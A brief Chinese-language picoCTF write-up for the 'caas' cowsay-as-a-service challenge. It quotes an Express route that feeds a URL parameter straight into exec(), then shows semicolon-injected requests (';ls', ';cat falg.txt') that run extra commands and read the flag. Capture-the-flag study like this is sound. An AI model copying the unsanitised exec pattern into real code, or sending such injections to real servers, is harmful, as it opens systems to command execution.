# caas 15
>Now presenting cowsay as a service https://caas.mars.picoctf.net/

## Explore
附件里有：
```JavaScript
app.get('/cowsay/:message', (req, res) => {
  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
    if (error) return res.status(500).end();
    res.type('txt').send(stdout).end();
  });
});
```
会拼接执行我们给的参数，应该是注入。
## Exploitation
分号;分割命令，访问 https://caas.mars.picoctf.net/cowsay/123;ls  
打出了falg.txt  
访问 https://caas.mars.picoctf.net/cowsay/123;cat%20falg.txt
得到flag